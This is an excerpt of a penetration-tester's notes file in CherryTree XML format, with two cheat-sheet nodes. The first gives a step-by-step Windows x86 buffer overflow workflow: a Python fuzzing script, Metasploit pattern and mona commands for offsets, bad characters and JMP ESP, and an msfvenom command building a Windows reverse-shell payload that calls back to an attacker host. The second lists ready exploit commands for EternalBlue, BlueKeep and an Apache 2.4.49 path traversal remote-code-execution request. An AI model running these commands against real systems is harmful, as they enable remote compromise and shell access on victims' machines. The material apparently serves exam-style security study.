      <node name="Windows x86 Buffer Overflow" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>import socket, time
payload = b&quot;A&quot; * 100
while True:
    try:
        s = socket.socket()
        s.connect((&apos;&lt;TARGET_IP&gt;&apos;, &lt;PORT&gt;))
        s.send(b&quot;COMMAND &quot; + payload + b&quot;\r&quot;)
        s.close()
        payload += b&quot;A&quot; * 100
    except:
        print(f&quot;[!] Crashed at ~{len(payload)} bytes&quot;)
        break
# Step 1: Fuzzing script to find crash threshold
--------------------------------------------------
msf-pattern_create -l &lt;CRASH_LENGTH&gt;
# Step 2: Generate unique cyclic pattern
--------------------------------------------------
msf-pattern_offset -l &lt;CRASH_LENGTH&gt; -q &lt;EIP_VALUE&gt;
# Step 2: Calculate exact EIP offset
--------------------------------------------------
!mona bytearray -b &quot;\x00&quot;
# Step 3: Generate byte array in Immunity Debugger
--------------------------------------------------
!mona compare -f C:\mona\bytearray.bin -a &lt;ESP_ADDRESS&gt;
# Step 3: Identify bad characters corrupting memory
--------------------------------------------------
!mona jmp -r esp -cpb &quot;\x00\x0a\x0d&quot;
# Step 4: Find JMP ESP instruction pointer
--------------------------------------------------
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f python
# Step 5: Generate final payload excluding bad chars
--------------------------------------------------
</rich_text>
      </node>

      <node name="Common High-Value CVEs" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
# MS17-010 EternalBlue (Win7/2008 R2 SMBv1) -&gt; SYSTEM
--------------------------------------------------
msfconsole -x &quot;use exploit/windows/smb/ms17_010_eternalblue&quot;
# MS17-010 Metasploit module
--------------------------------------------------
curl -s &apos;http://&lt;TARGET_IP&gt;/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&apos; -d &apos;echo;id&apos;
# CVE-2021-41773 Apache 2.4.49 Path Traversal / RCE
--------------------------------------------------
msfconsole -x &quot;use exploit/windows/rdp/cve_2019_0708_bluekeep_rce&quot;
# CVE-2019-0708 BlueKeep (Win7/2008 RDP) -&gt; SYSTEM (High crash risk)
--------------------------------------------------
searchsploit &lt;SERVICE_NAME&gt; &lt;VERSION&gt;
# Local exploit database search
--------------------------------------------------
</rich_text>
      </node>
